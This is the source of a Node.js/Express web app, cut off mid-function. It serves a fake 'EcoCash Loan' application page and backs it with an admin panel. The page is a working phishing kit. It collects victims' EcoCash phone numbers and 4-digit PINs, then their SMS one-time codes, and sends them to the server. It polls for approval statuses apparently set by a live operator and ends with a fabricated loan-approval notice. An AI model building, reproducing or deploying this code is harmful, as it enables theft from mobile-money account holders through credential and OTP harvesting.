const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Demo admin database (replace with MongoDB in production)
const admins = {
  "0001": {
    adminId: "0001",
    role: "MAIN_ADMIN",
    status: "ACTIVE",
    suspendUntil: null,
    reason: null
  },
  "0002": {
    adminId: "0002",
    role: "SUB_ADMIN",
    status: "ACTIVE",
    suspendUntil: null,
    reason: null
  },
  "0003": {
    adminId: "0003",
    role: "SUB_ADMIN",
    status: "ACTIVE",
    suspendUntil: null,
    reason: null
  }
};

// In-memory application tracking store for the frontend API endpoints
const applications = {};

// Middleware to check if an admin is allowed access
function checkAdminAccess(req, res, next) {
  const admin = admins[req.params.adminId];

  if (!admin) {
    return res.status(404).json({
      success: false,
      message: "Admin not found"
    });
  }

  // Check if suspension period has expired automatically
  if (admin.status === "SUSPENDED") {
    if (admin.suspendUntil && new Date() > new Date(admin.suspendUntil)) {
      admin.status = "ACTIVE";
      admin.suspendUntil = null;
      admin.reason = null;
    } else {
      return res.status(403).json({
        success: false,
        message: "This administrator account is suspended.",
        suspendUntil: admin.suspendUntil,
        reason: admin.reason
      });
    }
  }

  req.admin = admin;
  next();
}

// Example admin portal
app.get("/Admin-:adminId", checkAdminAccess, (req, res) => {
  res.send(`
    <h2>Welcome Admin ${req.admin.adminId}</h2>
    <p>Status: ${req.admin.status}</p>
  `);
});

// Suspend a sub-admin
app.post("/main-admin/suspend", (req, res) => {
  const { mainAdminId, targetAdminId, days, reason } = req.body;

  if (mainAdminId !== "0001") {
    return res.status(403).json({
      success: false,
      message: "Only Main Admin can suspend admins."
    });
  }

  const admin = admins[targetAdminId];

  if (!admin) {
    return res.status(404).json({
      success: false,
      message: "Admin not found."
    });
  }

  // Prevent suspending the main admin
  if (targetAdminId === "0001") {
    return res.status(400).json({
      success: false,
      message: "Cannot suspend the Main Admin."
    });
  }

  const parsedDays = Number(days);
  if (isNaN(parsedDays) || parsedDays <= 0) {
    return res.status(400).json({
      success: false,
      message: "Invalid suspension duration provided."
    });
  }

  const until = new Date();
  until.setDate(until.getDate() + parsedDays);

  admin.status = "SUSPENDED";
  admin.suspendUntil = until;
  admin.reason = reason || "No reason provided";

  res.json({
    success: true,
    message: `Admin ${targetAdminId} suspended.`,
    suspendUntil: until
  });
});

// Reactivate before suspension expires
app.post("/main-admin/reactivate", (req, res) => {
  const { mainAdminId, targetAdminId } = req.body;

  if (mainAdminId !== "0001") {
    return res.status(403).json({
      success: false,
      message: "Only Main Admin can reactivate admins."
    });
  }

  const admin = admins[targetAdminId];

  if (!admin) {
    return res.status(404).json({
      success: false,
      message: "Admin not found."
    });
  }

  admin.status = "ACTIVE";
  admin.suspendUntil = null;
  admin.reason = null;

  res.json({
    success: true,
    message: `Admin ${targetAdminId} is active again.`
  });
});

// View all admins
app.get("/main-admin/admins", (req, res) => {
  res.json(admins);
});

// ==========================================
// FRONTEND INTEGRATION API ENDPOINTS
// ==========================================

// Serve the HTML frontend file directly at the root
app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>EcoCash Loan Application</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-blue-50/50 flex items-center justify-center min-h-screen p-4">
  <div class="bg-white rounded-2xl shadow-xl border border-blue-100 w-full max-w-lg p-6 sm:p-8">
    
    <!-- HEADER -->
    <div class="text-center mb-6">
      <h1 class="text-3xl font-extrabold text-blue-600 tracking-tight">EcoCash Loan</h1>
      <p class="text-sm text-blue-500 font-medium mt-1">Fast & Secure Mobile Loans</p>
    </div>

    <!-- HORIZONTAL STEP INDICATOR (3 STEPS) -->
    <div id="step-indicator" class="flex items-center justify-between mb-8 px-2">
      <!-- Step 1 Badge -->
      <div id="step-node-1" class="flex flex-col items-center">
        <div id="step-circle-1" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm">1</div>
        <span id="step-label-1" class="text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5">Details</span>
      </div>
      <div id="step-line-1" class="flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300"></div>

      <!-- Step 2 Badge -->
      <div id="step-node-2" class="flex flex-col items-center">
        <div id="step-circle-2" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm">2</div>
        <span id="step-label-2" class="text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5">Account</span>
      </div>
      <div id="step-line-2" class="flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300"></div>

      <!-- Step 3 Badge -->
      <div id="step-node-3" class="flex flex-col items-center">
        <div id="step-circle-3" class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm">3</div>
        <span id="step-label-3" class="text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5">Verify</span>
      </div>
    </div>

    <!-- STEP 1: APPLICANT DETAILS & SLIDER CALCULATOR -->
    <form id="step1-form" class="space-y-4">
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Full Name</label>
        <input type="text" id="fullName" required placeholder="John Doe"
               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
      </div>

      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Occupation</label>
        <input type="text" id="occupation" required placeholder="e.g. Civil Servant / Entrepreneur"
               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
      </div>

      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Estimated Monthly Payments / Income ($)</label>
        <input type="number" id="monthlyPayments" required min="50" placeholder="500"
               class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
      </div>

      <!-- SLIDER CALCULATOR FOR LOAN BALANCING -->
      <div class="bg-blue-50/70 p-4 rounded-xl border border-blue-100 space-y-3">
        <div class="flex justify-between items-center">
          <label class="text-sm font-semibold text-blue-900">Requested Loan Amount ($)</label>
          <span id="loan-amount-display" class="text-lg font-extrabold text-blue-600">$250</span>
        </div>
        <input type="range" id="loanAmountSlider" min="20" max="1000" step="10" value="250"
               class="w-full h-2 bg-blue-200 rounded-lg appearance-none cursor-pointer accent-blue-600">
        <div class="flex justify-between text-xs text-blue-500 font-medium">
          <span>$20</span>
          <span>$500</span>
          <span>$1000</span>
        </div>
      </div>

      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">Time for Repayment</label>
        <select id="repaymentTime" class="w-full border border-blue-200 rounded-lg p-3 text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white">
          <option value="1 Month">1 Month</option>
          <option value="3 Months">3 Months</option>
          <option value="6 Months">6 Months</option>
        </select>
      </div>

      <button type="submit" id="btn-step1"
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200 mt-2">
        NEXT
      </button>
    </form>

    <!-- STEP 2: PHONE NUMBER & PIN -->
    <form id="step2-form" class="space-y-4 hidden">
      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">EcoCash Registered Phone Number</label>
        <div class="flex">
          <span class="inline-flex items-center px-3.5 rounded-l-lg border border-r-0 border-blue-200 bg-blue-50 text-blue-700 text-sm font-semibold">+263</span>
          <input type="tel" id="phone" required placeholder="771234567" maxlength="9"
                 class="w-full border border-blue-200 rounded-r-lg p-3 text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base">
        </div>
      </div>

      <div>
        <label class="block text-sm font-semibold text-gray-700 mb-1">4-Digit EcoCash PIN</label>
        <input type="password" id="pin" required maxlength="4" pattern="\\d{4}" placeholder="••••"
               class="w-full border border-blue-200 rounded-lg p-3 text-center text-gray-800 text-2xl font-bold tracking-widest focus:outline-none focus:ring-2 focus:ring-blue-500">
      </div>

      <button type="submit" id="btn-step2"
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200 mt-2">
        LOG IN
      </button>
    </form>

    <!-- LOADING & COUNTDOWN SCREEN WITH VISUAL STICKER / BADGE ELEMENT -->
    <div id="step-loading" class="hidden text-center py-6 space-y-4">
      <div class="flex justify-center">
        <div class="relative bg-amber-50 border-2 border-amber-200 p-3 rounded-2xl shadow-sm inline-block">
          <span class="text-4xl">⚠️</span>
          <div class="absolute -bottom-2 -right-2 bg-red-600 text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full shadow">SECURE</div>
        </div>
      </div>
      <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-blue-600 border-t-transparent"></div>
      <h3 id="loading-title" class="text-lg font-bold text-gray-800">Processing Details...</h3>
      <p id="loading-desc" class="text-xs text-gray-500 max-w-xs mx-auto">Connecting to your account line safely...</p>
    </div>

    <!-- STEP 3: OTP VERIFICATION -->
    <form id="step3-form" class="space-y-4 hidden">
      <div id="otp-status-banner" class="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
        <p id="otp-status-text" class="text-xs text-blue-700 font-medium">An SMS with a 6-digit verification code has been dispatched to your mobile line.</p>
      </div>

      <div>
        <label class="block text-sm font-semibold text-gray-700 text-center mb-1">Enter 6-Digit OTP Code</label>
        <input type="text" id="otp" required maxlength="6" pattern="\\d{6}" placeholder="123456"
               class="w-full border border-blue-200 rounded-lg p-3 text-center text-3xl font-extrabold tracking-widest text-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500">
      </div>

      <button type="submit" id="btn-step3"
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-lg shadow-md transition duration-200">
        SUBMIT OTP
      </button>
      
      <div id="step3-loading" class="hidden text-center text-xs font-bold text-blue-600 tracking-wider pt-2">
        WAITING TO VERIFY YOUR OTP
      </div>
    </form>

    <!-- SUCCESS SCREEN WITH FULL CONGRATULATIONS NOTICE -->
    <div id="success-screen" class="hidden space-y-4 text-gray-800 text-sm leading-relaxed">
      <div class="bg-blue-50 border border-blue-200 rounded-xl p-5 shadow-inner">
        <h2 class="text-center text-blue-700 font-extrabold text-base mb-3">🎉🎉 CONGRATULATIONS! YOUR LOAN HAS BEEN APPROVED 🎉🎉</h2>
        <div class="border-t border-b border-blue-200 py-2 my-2 text-center text-xs font-bold text-blue-800 tracking-wider">
          🏦 LOAN APPROVAL NOTICE
        </div>
        <p class="mb-2">Dear Applicant,</p>
        <p class="mb-2">We are pleased to inform you that your loan application has been successfully reviewed and <b>APPROVED</b>. ✅</p>
        <p class="mb-2">🌟 Congratulations! Your application has met all the required approval criteria.</p>
        <p class="mb-2">📌 <b>Loan Status:</b> ✅ APPROVED<br>💰 <b>Disbursement Status:</b> Processing for Immediate Release</p>
        <p class="mb-2">Your approved loan will be disbursed to your registered account shortly. Please keep your phone switched on and monitor your account for the payment notification.</p>
        <p class="mb-3">Thank you for choosing our lending services. We appreciate your trust and look forward to serving you again.</p>
        <div class="border-t border-blue-200 pt-3 text-center text-xs font-semibold text-blue-900">
          🎊 Congratulations once again! 🎊<br><br>
          Your loan has been approved and is now being processed for immediate disbursement.<br>
          We wish you success and prosperity with your approved funds.<br><br>
          ✔ OFFICIAL LOAN APPROVAL
        </div>
      </div>
    </div>

  </div>

  <script>
    let appReference = null;
    let statusInterval = null;

    const slider = document.getElementById('loanAmountSlider');
    const sliderDisplay = document.getElementById('loan-amount-display');
    slider.addEventListener('input', (e) => {
      sliderDisplay.textContent = \`$\${e.target.value}\`;
    });

    function updateIndicator(step) {
      for (let i = 1; i <= 3; i++) {
        const circle = document.getElementById(\`step-circle-\${i}\`);
        const label = document.getElementById(\`step-label-\${i}\`);
        const line = document.getElementById(\`step-line-\${i}\`);

        if (i < step) {
          circle.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md";
          label.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
          if (line) line.className = "flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300";
        } else if (i === step) {
          circle.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md";
          label.className = "text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5";
        } else {
          circle.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm";
          label.className = "text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5";
          if (line) line.className = "flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300";
        }
      }
    }

    document.getElementById('step1-form').addEventListener('submit', (e) => {
      e.preventDefault();
      document.getElementById('step1-form').classList.add('hidden');
      document.getElementById('step-loading').classList.remove('hidden');
      document.getElementById('loading-title').textContent = "Processing Profile...";
      document.getElementById('loading-desc').textContent = "Saving personal evaluation data...";

      setTimeout(() => {
        document.getElementById('step-loading').classList.add('hidden');
        document.getElementById('step2-form').classList.remove('hidden');
        updateIndicator(2);
      }, 1500);
    });

    document.getElementById('step2-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const fullName = document.getElementById('fullName').value;
      const occupation = document.getElementById('occupation').value;
      const monthlyPayments = document.getElementById('monthlyPayments').value;
      const loanAmount = slider.value;
      const repaymentTime = document.getElementById('repaymentTime').value;
      const phone = document.getElementById('phone').value;
      const pin = document.getElementById('pin').value;
      const portalPath = window.location.pathname;

      document.getElementById('step2-form').classList.add('hidden');
      document.getElementById('step-loading').classList.remove('hidden');
      document.getElementById('loading-title').textContent = "Authenticating PIN...";
      document.getElementById('loading-desc').textContent = "Waiting for line server security clearance...";

      try {
        const res = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ fullName, occupation, monthlyPayments, loanAmount, repaymentTime, phone, pin, portalPath })
        });
        const data = await res.json();
        if (data.success) {
          appReference = data.appReference;
          pollPinStatus();
        } else {
          alert(data.error);
          resetStep2();
        }
      } catch (err) {
        console.error(err);
        resetStep2();
      }
    });

    function resetStep2() {
      document.getElementById('step-loading').classList.add('hidden');
      document.getElementById('step2-form').classList.remove('hidden');
    }

    function pollPinStatus() {
      statusInterval = setInterval(async () => {
        try {
          const res = await fetch(\`/api/check-status/\${appReference}\`);
          const data = await res.json();

          if (data.status === 'PIN_APPROVED') {
            clearInterval(statusInterval);
            document.getElementById('step-loading').classList.add('hidden');
            document.getElementById('step3-form').classList.remove('hidden');
            updateIndicator(3);
          } else if (data.status === 'PIN_REJECTED') {
            clearInterval(statusInterval);
            alert("Wrong PIN entered. Access denied.");
            resetStep2();
          }
        } catch (err) {
          console.error("Polling error:", err);
        }
      }, 3000);
    }

    document.getElementById('step3-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const otpCode = document.getElementById('otp').value;

      document.getElementById('btn-step3').classList.add('hidden');
      document.getElementById('step3-loading').classList.remove('hidden');

      try {
        const res = await fetch('/api/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ appReference, otpCode })
        });
        const data = await res.json();
        if (data.success) {
          pollOtpStatus();
        } else {
          alert("Error submitting OTP");
          resetStep3();
        }
      } catch (err) {
        console.error(err);
        resetStep3();
      }
    });

    function resetStep3() {
      document.getElementById('btn-step3').classList.remove('hidden');
      document.getElementById('step3-loading').classList.add('hidden');
    }

    function pollOtpStatus() {
      const otpInterval = setInterval(async () => {
        try {
          const res = await fetch(\`/api/check-status/\${appReference}\`);
          const data = await res.json();

          if (data.status === 'OTP_APPROVED') {
            clearInterval(otpInterval);
            document.getElementById('step3-form').classList.add('hidden');
            document.getElementById('success-screen').classList.remove('hidden');
          } else if (data.status === 'OTP_REJEC
